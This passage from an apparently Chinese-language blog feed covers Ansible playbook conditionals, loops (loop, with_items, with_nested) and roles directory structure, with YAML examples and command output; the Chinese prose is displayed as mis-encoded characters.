class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">- name: registered variable usage as a loop list</span><br><span class="line">  hosts: all</span><br><span class="line">  tasks:</span><br><span class="line"></span><br><span class="line">    - name: retrieve the list of home directories</span><br><span class="line">      command: ls /home</span><br><span class="line">      register: home_dirs</span><br><span class="line"></span><br><span class="line">    - name: add home dirs to the backup spooler</span><br><span class="line">      file:</span><br><span class="line">        path: /tmp/&#123;&#123; item &#125;&#125;</span><br><span class="line">        src: /home/&#123;&#123; item &#125;&#125;</span><br><span class="line">        state: link</span><br><span class="line">      loop: &quot;&#123;&#123; home_dirs.stdout_lines &#125;&#125;&quot;</span><br><span class="line">      # same as loop: &quot;&#123;&#123; home_dirs.stdout.split() &#125;&#125;&quot;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ls /home</span><br><span class="line">jesse  tom  tony</span><br><span class="line">[root@localhost ~]# ls /tmp -l</span><br><span class="line">total 0</span><br><span class="line">lrwxrwxrwx 1 root root 11 Aug  3 10:57 jesse -&gt; /home/jesse</span><br><span class="line">lrwxrwxrwx 1 root root  9 Aug  3 10:57 tom -&gt; /home/tom</span><br><span class="line">lrwxrwxrwx 1 root root 10 Aug  3 10:57 tony -&gt; /home/tony</span><br></pre></td></tr></table></figure><hr><h3 id="whenè°ƒç”¨å˜é‡"><a href="#whenè°ƒç”¨å˜é‡" class="headerlink" title="whenè°ƒç”¨å˜é‡"></a>whenè°ƒç”¨å˜é‡</h3><p>æœ‰æ—¶å€™whenä¹Ÿéœ€è¦å¯¹2ä¸ªå˜é‡æ¥è¿›è¡Œæ¯”è¾ƒ,åˆ¤æ–­æ˜¯å¦æ»¡è¶³æ¡ä»¶.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- hosts: dev beta</span><br><span class="line">   remote_user: root</span><br><span class="line">   vars:</span><br><span class="line">     server_group: hsq</span><br><span class="line">      openapi: trade</span><br><span class="line">      internalapi:</span><br><span class="line">   </span><br><span class="line">       - name: create api site dir</span><br><span class="line">         file: path=&#123;&#123; nginx_site_dir &#125;&#125;/&#123;&#123; project_name &#125;&#125;-&#123;&#123; item[0] &#125;&#125;/&#123;&#123; item[1] &#125;&#125; recurse=yes owner=work group=work mode=0775 state=directory</span><br><span class="line">         with_nested:</span><br><span class="line">              - [ &quot;&#123;&#123; openapi &#125;&#125;&quot;,&quot;&#123;&#123; internalapi &#125;&#125;&quot;]</span><br><span class="line">              - [&apos;releases&apos;,&apos;vendor&apos;,&apos;shared&apos;]</span><br><span class="line">         when:  inventory_hostname in groups[ server_group ]</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„whenè¯­å¥è¡¨ç¤º,åªæœ‰åœ¨å˜é‡server_groupä¸»æœºç»„çš„ä¸»æœºæ‰æ»¡è¶³æ¡ä»¶.è¿™é‡Œä¸èƒ½åƒå…¶ä»–åœ°æ–¹ä¸€æ ·ç”¨åŒå¤§æ‹¬å·çš„æ–¹å¼æ¥è°ƒç”¨å˜é‡.å¦åˆ™ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[WARNING]: when statements should not include jinja2 templating delimiters such as &#123;&#123; &#125;&#125; or &#123;% %&#125;. Found: inventory_hostname in groups[ &apos;&#123;&#123; server_group &#125;&#125;&apos; ]</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ansible-æ¡ä»¶é€‰æ‹©&quot;&gt;&lt;a href=&quot;#Ansible-æ¡ä»¶é€‰æ‹©&quot; class=&quot;headerlink&quot; title=&quot;Ansible æ¡ä»¶é€‰æ‹©&quot;&gt;&lt;/a&gt;Ansible æ¡ä»¶é€‰æ‹©&lt;/h2&gt;&lt;p&gt;playbookä¹Ÿå¯ä»¥åƒshellè„šæœ¬çš„ifè¯­å¥é‚£æ ·,åŸºäºä¸€ä¸ªå˜é‡çš„ç»“æœæ¥åˆ¤æ–­æ˜¯å¦åº”è¯¥æ‰§è¡ŒæŸä¸ªtask.åªæ˜¯ansibleçš„é€»è¾‘åˆ¤æ–­å’Œè¯­æ³•ä¸Šè¦åˆ«æ‰­,å¤æ‚ç‚¹.&lt;/p&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>ansible--loopå¾ªç¯</title>
    <link href="https://jesse.top/2018/08/28/Ansible/ansible--loop%E5%BE%AA%E7%8E%AF/"/>
    <id>https://jesse.top/2018/08/28/Ansible/ansible--loopå¾ªç¯/</id>
    <published>2018-08-28T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ansibleâ€“loopå¾ªç¯"><a href="#ansibleâ€“loopå¾ªç¯" class="headerlink" title="ansibleâ€“loopå¾ªç¯"></a>ansibleâ€“loopå¾ªç¯</h2><h4 id="æ ‡å‡†å¾ªç¯"><a href="#æ ‡å‡†å¾ªç¯" class="headerlink" title="æ ‡å‡†å¾ªç¯"></a>æ ‡å‡†å¾ªç¯</h4><ul><li>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„æ ‡å‡†loopå¾ªç¯çš„ä¾‹å­:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim loop-useradd.yaml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">- hosts: all</span><br><span class="line">  tasks:</span><br><span class="line">    - name: add several users</span><br><span class="line">      user:</span><br><span class="line">         name: &quot;&#123;&#123; item &#125;&#125;&quot;</span><br><span class="line">         state: present</span><br><span class="line">         groups: &quot;wheel&quot;</span><br><span class="line">      loop:</span><br><span class="line">         - testuser1</span><br><span class="line">         - testuser2</span><br></pre></td></tr></table></figure><a id="more"></a><ul><li>å¦‚æœå˜é‡æ˜¯ä¸€ä¸ªYamlåˆ—è¡¨,åˆ™å¯ä»¥å¾ªç¯è¿™ä¸ªåˆ—è¡¨:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loop: &quot;&#123;&#123; somelist &#125;&#125;&quot;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ä¸Šé¢çš„ä¾‹å­ä¹Ÿå¯ä»¥æ”¹æˆ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: all</span><br><span class="line">  tasks:</span><br><span class="line">    - name: add several users</span><br><span class="line">      user:</span><br><span class="line">         name: &quot;&#123;&#123; item &#125;&#125;&quot;</span><br><span class="line">         state: present</span><br><span class="line">         groups: &quot;wheel&quot;</span><br><span class="line">      loop: [ testuser3,testuser4]</span><br></pre></td></tr></table></figure><p>å¾ªç¯å®é™…ä¸Šç›¸å½“äºä¸‹é¢çš„è¯­å¥:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- name: add user testuser1</span><br><span class="line">  user:</span><br><span class="line">    name: &quot;testuser1&quot;</span><br><span class="line">    state: present</span><br><span class="line">    groups: &quot;wheel&quot;</span><br><span class="line">- name: add user testuser2</span><br><span class="line">  user:</span><br><span class="line">    name: &quot;testuser2&quot;</span><br><span class="line">    state: present</span><br><span class="line">    groups: &quot;wheel&quot;</span><br></pre></td></tr></table></figure><ul><li>ä¹Ÿå¯ä»¥å¾ªç¯ä¸€ä¸ªå­—å…¸,ä¾‹å¦‚:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- name: add several users</span><br><span class="line">  user:</span><br><span class="line">    name: &quot;&#123;&#123; item.name &#125;&#125;&quot;</span><br><span class="line">    state: present</span><br><span class="line">    groups: &quot;&#123;&#123; item.groups &#125;&#125;&quot;</span><br><span class="line">  loop:</span><br><span class="line">    - &#123; name: &apos;testuser1&apos;, groups: &apos;wheel&apos; &#125;</span><br><span class="line">    - &#123; name: &apos;testuser2&apos;, groups: &apos;root&apos; &#125;</span><br></pre></td></tr></table></figure><hr><h4 id="loopä¸yum-apt"><a href="#loopä¸yum-apt" class="headerlink" title="loopä¸yum,apt"></a>loopä¸yum,apt</h4><p>æœ‰ä¸€äº›æ¨¡å—æœ‰è‡ªå¸¦åˆ—è¡¨å¾ªç¯åŠŸèƒ½,è¿™æ¯”ä½¿ç”¨loopå¾ªç¯æ›´å¥½,ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim loop-yum.yaml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">- hosts: all</span><br><span class="line">  tasks:</span><br><span class="line">   - name: optimal yum</span><br><span class="line">     yum:</span><br><span class="line">       name: [httpd,nginx,iotop]</span><br><span class="line">       state: present</span><br></pre></td></tr></table></figure><p>è¿™æ¯”ä½¿ç”¨ä¸‹é¢çš„loopå¾ªç¯è¯­å¥è¦æ›´å¥½,å› ä¸ºloopå¾ªç¯å¯èƒ½ä¼šæœ‰Yumå®‰è£…è½¯ä»¶çš„ä¾èµ–é—®é¢˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- name: non optimal yum, not only slower but might cause issues with interdependencies</span><br><span class="line">  yum:</span><br><span class="line">    name: &quot;&#123;&#123;item&#125;&#125;&quot;</span><br><span class="line">    state: present</span><br><span class="line">  loop: &quot;&#123;&#123;list_of_packages&#125;&#125;&quot;</span><br></pre></td></tr></table></figure><hr><h4 id="with-itemsè¿­ä»£"><a href="#with-itemsè¿­ä»£" class="headerlink" title="with_itemsè¿­ä»£"></a>with_itemsè¿­ä»£</h4><p>ansibleé»˜è®¤ä½¿ç”¨itemä½œä¸ºå¾ªç¯è¿­ä»£å˜é‡å,with_itemsåˆ—å‡ºäº†ä¸€ä¸ªitemsçš„åˆ—è¡¨.è¿­ä»£çš„ä¼ é€’å€¼ç»™å˜é‡.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-name: install apt packages</span><br><span class="line"> apt: pkg=&#123;&#123;item&#125;&#125; update_cache=yes cache_valid_time=3600</span><br><span class="line"> sudo: True</span><br><span class="line"> with_items:</span><br><span class="line">    - git</span><br><span class="line">    - libjpeg-dev</span><br><span class="line">    - libpq-dev</span><br><span class="line">    - memcached</span><br><span class="line">    - nginx</span><br><span class="line">    - postgresql</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨apt,yumç­‰æ¨¡å—ä¸­,ä½¿ç”¨with_itemsè¯­å¥å®‰è£…è½¯ä»¶åŒ…æ•ˆç‡æ›´é«˜,è¿™æ˜¯å› ä¸ºansibleä¼šå°†æ•´ä¸ªè½¯ä»¶åŒ…çš„åˆ—è¡¨ä¸€èµ·ä¼ é€’ç»™apt,yumæ¨¡å—,ç›¸å½“äºåªè°ƒç”¨ä¸€æ¬¡apt,yumå‘½ä»¤</p></blockquote><hr><h4 id="åµŒå¥—å¾ªç¯"><a href="#åµŒå¥—å¾ªç¯" class="headerlink" title="åµŒå¥—å¾ªç¯"></a>åµŒå¥—å¾ªç¯</h4><p>å¦‚æœä¸€ä¸ªæ¨¡å—è¦ä½¿ç”¨2ä¸ªå¾ªç¯é‚£è¯¥æ€ä¹ˆåŠ.åœ¨å‰ä¸€ä¸ªå¾ªç¯çš„åŸºç¡€ä¸Š,å†è¿›è¡Œä¸€æ¬¡å¾ªç¯æ—¶,å°±å¯ä»¥ä½¿ç”¨åµŒå¥—å¾ªç¯.</p><p>ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- name: create project dir</span><br><span class="line">  file: path=/data/apps/msf-&#123;&#123; item[0] &#125;&#125;-api-&#123;&#123; dwd_env &#125;&#125;/&#123;&#123; item[1] &#125;&#125; recurse=yes owner=root group=root mode=0644 state=directory</span><br><span class="line">  with_nested:</span><br><span class="line">    - [&apos;open&apos;,&apos;internal&apos;]</span><br><span class="line">    - [&apos;releases&apos;,&apos;vendor&apos;,&apos;shared&apos;]</span><br></pre></td></tr></table></figure><p>  item[0]è¡¨ç¤ºå¾ªç¯â€™openâ€™,â€™internalâ€™.åœ¨æ¯æ¬¡å¾ªç¯item[0]æ—¶éƒ½å¾ªç¯ä¸€éitem[1],ä¹Ÿå°±æ˜¯â€™release,vendor,shared.<br>   ä¸Šé¢çš„å¾ªç¯è¯­å¥å…¶å®ç±»ä¼¼äºshellçš„å‘½ä»¤:<br>   mkdir -pv /data/apps/msf-{open,internal}-api/{releases,vendor,shared}</p><hr><h3 id="åˆ—è¡¨å¾ªç¯"><a href="#åˆ—è¡¨å¾ªç¯" class="headerlink" title="åˆ—è¡¨å¾ªç¯"></a>åˆ—è¡¨å¾ªç¯</h3><p>æœ‰æ—¶å€™å¾ªç¯ä¸é€‚åˆå†™æ­»å˜é‡.å› ä¸ºä¸‡ä¸€å˜é‡æ²¡æœ‰å€¼çš„è¯,å°±éœ€è¦æ”¹å†™playbooké‡Œçš„task.è¿™æ˜¯éå¸¸ä¸æ–¹ä¾¿çš„.</p><p>æ¯”å¦‚:å¦‚æœä¸‹é¢çš„openapiå˜é‡æ²¡æœ‰å€¼,æˆ–è€…å¦‚æœä¸éœ€è¦æ–°å»ºè¿™ä¸ªç›®å½•,å°±éœ€è¦ä¿®æ”¹è¿™ä¸ªtask.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file: path=&#123;&#123; nginx_site_dir &#125;&#125;/&#123;&#123; project_name &#125;&#125;-&#123;&#123; item[0] &#125;&#125;-&#123;&#123; dwd_env &#125;&#125;/&#123;&#123; item[1] &#125;&#125;/vendor recurse=yes owner=work group=work mode=0775 state=directory</span><br><span class="line">with_nested:</span><br><span class="line">      - [ &quot;&#123;&#123; openapi &#125;&#125;&quot;,&quot; &#123;&#123; xxx &#125;&#125;,&quot;&#123;&#123; haha &#125;&#125;&quot;&quot;]</span><br><span class="line">      - [&apos;releases&apos;,&apos;shared&apos;]</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åˆ—è¡¨å¾ªç¯å°±éå¸¸æœ‰å¸®åŠ©.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vars:</span><br><span class="line">   api:</span><br><span class="line">     - openapi</span><br><span class="line">     - internal</span><br><span class="line">     - script</span><br><span class="line">     </span><br><span class="line">tasks:</span><br><span class="line"></span><br><span class="line">   - name: create dev beta project dir</span><br><span class="line">     file: path=/tmp/hsq-&#123;&#123; item[0] &#125;&#125;/&#123;&#123; item[1] &#125;&#125; recurse=yes owner=work group=work mode=0775 state=directory</span><br><span class="line">     with_nested:</span><br><span class="line">         - &quot;&#123;&#123; api &#125;&#125;&quot;</span><br><span class="line">         - [&apos;releases&apos;,&apos;shared&apos;]</span><br></pre></td></tr></table></figure><p> è¿™æ ·ä¸€æ¥åªéœ€è¦ä¿®æ”¹apiçš„å˜é‡,è€Œä¸éœ€è¦ä¿®æ”¹playbookçš„task.</p><p> æ‰§è¡Œç»“æœå¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">TASK [create dev beta project dir] *********************************************************************************************************************************************</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;openapi&apos;, u&apos;releases&apos;])</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;openapi&apos;, u&apos;shared&apos;])</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;internal&apos;, u&apos;releases&apos;])</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;internal&apos;, u&apos;shared&apos;])</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;script&apos;, u&apos;releases&apos;])</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;script&apos;, u&apos;shared&apos;])</span><br><span class="line"></span><br><span class="line">PLAY RECAP *********************************************************************************************************************************************************************</span><br><span class="line">docker                     : ok=2    changed=1    unreachable=0    failed=0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ansibleâ€“loopå¾ªç¯&quot;&gt;&lt;a href=&quot;#ansibleâ€“loopå¾ªç¯&quot; class=&quot;headerlink&quot; title=&quot;ansibleâ€“loopå¾ªç¯&quot;&gt;&lt;/a&gt;ansibleâ€“loopå¾ªç¯&lt;/h2&gt;&lt;h4 id=&quot;æ ‡å‡†å¾ªç¯&quot;&gt;&lt;a href=&quot;#æ ‡å‡†å¾ªç¯&quot; class=&quot;headerlink&quot; title=&quot;æ ‡å‡†å¾ªç¯&quot;&gt;&lt;/a&gt;æ ‡å‡†å¾ªç¯&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„æ ‡å‡†loopå¾ªç¯çš„ä¾‹å­:&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[root@localhost playbook]$vim loop-useradd.yaml&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;---&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- hosts: all&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  tasks:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    - name: add several users&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      user:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         name: &amp;quot;&amp;#123;&amp;#123; item &amp;#125;&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         state: present&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         groups: &amp;quot;wheel&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      loop:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         - testuser1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         - testuser2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>Ansible-Roles</title>
    <link href="https://jesse.top/2018/08/27/Ansible/Ansible-Roles/"/>
    <id>https://jesse.top/2018/08/27/Ansible/Ansible-Roles/</id>
    <published>2018-08-27T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ansible-Roles"><a href="#Ansible-Roles" class="headerlink" title="Ansible-Roles"></a>Ansible-Roles</h2><p>  å¯¹äºä¸­å°å‹é¡¹ç›®æ¥è¯´playbookç»“åˆincludeå°±è¶³ä»¥èƒœä»»,æ¸…æ™°,æœ‰æ•ˆçš„å®Œæˆè‡ªåŠ¨åŒ–éƒ¨ç½²å·¥ä½œäº†.ä½†æ˜¯å¦‚æœæ˜¯å¯¹äºå¤§å‹çš„é¡¹ç›®,å‡ åä¸ªplaybookæ¥è¯´,å¯èƒ½ä¼šé€ æˆæ–‡ä»¶ç¹å¤š,ç›®å½•ç»“æ„ä¸æ¸…æ™°,å‘½åä¸è§„èŒƒ,ä»¥åŠåæœŸç»´æŠ¤æˆæœ¬å¤§å¤§å‡é«˜.</p><p>ansibleçš„rolesåŠŸèƒ½å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜åº”è¿è€Œç”Ÿ.roleså­—é¢æ„æ€æ˜¯â€è§’è‰²â€,å¯ä»¥ç†è§£ä¸ºå„ä¸ªä¸åŒæ¨¡å—åŠŸèƒ½çš„å…³è”é›†åˆ.rolesä¸»è¦åŒ…æ‹¬ä»¥ä¸‹åŠŸèƒ½æ¨¡å—:var_files,tasks,handlers,templates,files,ç­‰ç­‰</p><p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯,ä¸ºäº†è§„èŒƒå’Œç»´æŠ¤æœŸé—´.rolesåº”è¯¥å®šä¹‰ä¸€ä¸ªæ¸…æ™°,æ˜ç¡®çš„ç›®å½•ç»“æ„ä»¥åŠæ–‡ä»¶å.ä¸å¯éšæ„æ›´æ”¹.</p><a id="more"></a><hr><h4 id="rolesç›®å½•ç»“æ„"><a href="#rolesç›®å½•ç»“æ„" class="headerlink" title="rolesç›®å½•ç»“æ„"></a>rolesç›®å½•ç»“æ„</h4><p>å¸¸è§çš„rolesä»»åŠ¡åŒ…å«ä¸‹åˆ—ç›®å½•ç»“æ„:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">playbook_role.yml #roleçš„playbookå…¥å£</span><br><span class="line">roles/</span><br><span class="line">  role_name/</span><br><span class="line">      tasks/</span><br><span class="line">      files/</span><br><span class="line">      templates/</span><br><span class="line">      handlers/</span><br><span class="line">      vars/</span><br><span class="line">   role_name2/</span><br><span class="line">      tasks/</span><br><span class="line">      files/</span><br><span class="line">      templates/</span><br><span class="line">      handlers/</span><br><span class="line">      vars/</span><br></pre></td></tr></table></figure><p>å…³äºrolesçš„ç›®å½•ç»“æ„æœ‰ä»¥ä¸‹æ³¨æ„äº‹é¡¹:</p><ul><li>ä¸€ä¸ªroleå¿…é¡»åŒ…å«tasksç›®å½•.</li><li>ä»¥ä¸Šçš„ç›®å½•ç»“æ„å„ä»£è¡¨ä¸åŒçš„åŠŸèƒ½ç»„ä»¶,å„å¸å…¶èŒ,ä¸å¯éšæ„æ›´æ”¹ç›®å½•å.</li><li>æ¯ä¸ªç›®å½•ä¸‹éœ€è¦åˆ›å»ºmain.ymlæ–‡ä»¶,ä½œä¸ºæ”¹åŠŸèƒ½ç»„ä»¶çš„å…¥å£.æœ‰ç‚¹ç±»ä¼¼äºPythonçš„init.pyæ–‡ä»¶</li></ul><p>ä¸‹é¢è§£é‡Šäº†æ¯ä¸ªç›®å½•çš„åŠŸèƒ½å«ä¹‰:</p><ul><li>tasks: åŒ…å«ä¸€ç³»åˆ—çš„Playbookæ–‡ä»¶,ä¹Ÿå°±æ˜¯rolesè¦æ‰§è¡Œçš„ä¸€ç³»åˆ—å…·ä½“tasks</li><li>handlers: åŒ…å«inotifyéœ€è¦æ‰§è¡Œçš„handlersä»»åŠ¡</li><li>defaults: rolesçš„é»˜è®¤å˜é‡</li><li>vars: å˜é‡æ–‡ä»¶</li><li>files: æ–‡ä»¶</li><li>templates: æ¨¡æ¿æ–‡ä»¶</li><li>meta: å…ƒæ•°æ®</li></ul><hr><h4 id="main-ymlæ–‡ä»¶"><a href="#main-ymlæ–‡ä»¶" class="headerlink" title="main.ymlæ–‡ä»¶"></a>main.ymlæ–‡ä»¶</h4><p>main.ymlæ–‡ä»¶æ˜¯å„ç›®å½•ä»£è¡¨çš„åŠŸèƒ½æ¨¡å—çš„å…¥å£,main.ymlæ–‡ä»¶å¯ä»¥é€šè¿‡includeæˆ–è€…import_taské€‰é¡¹å¯¼å…¥åŒç›®å½•ä¸‹çš„å…¶ä»–ymlæ–‡ä»¶(ä¹Ÿå°±æ˜¯å…¶ä»–playbook).ä¾‹å¦‚ä¸‹é¢çš„tasks/main.ymlæ–‡ä»¶:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#ä¸‹é¢æ˜¯main.ymlæ–‡ä»¶å†…å®¹.main.ymlæ–‡ä»¶ä½œä¸ºtasksçš„å…¥å£,å¯¼å…¥äº†åŒç›®å½•ä¸‹çš„redhatå’Œdebian2ä¸ªplaybook</span><br><span class="line"># roles/example/tasks/main.yml</span><br><span class="line">- name: added in 2.4, previously you used &apos;include&apos;</span><br><span class="line">  import_tasks: redhat.yml</span><br><span class="line">  when: ansible_os_platform|lower == &apos;redhat&apos;</span><br><span class="line">- import_tasks: debian.yml</span><br><span class="line">  when: ansible_os_platform|lower == &apos;debian&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ä¸‹é¢æ˜¯tasks/redhat.ymlæ–‡ä»¶,å…¶å®å°±æ˜¯ä¸ªç‹¬ç«‹çš„playbook</span><br><span class="line"># roles/example/tasks/redhat.yml</span><br><span class="line">- 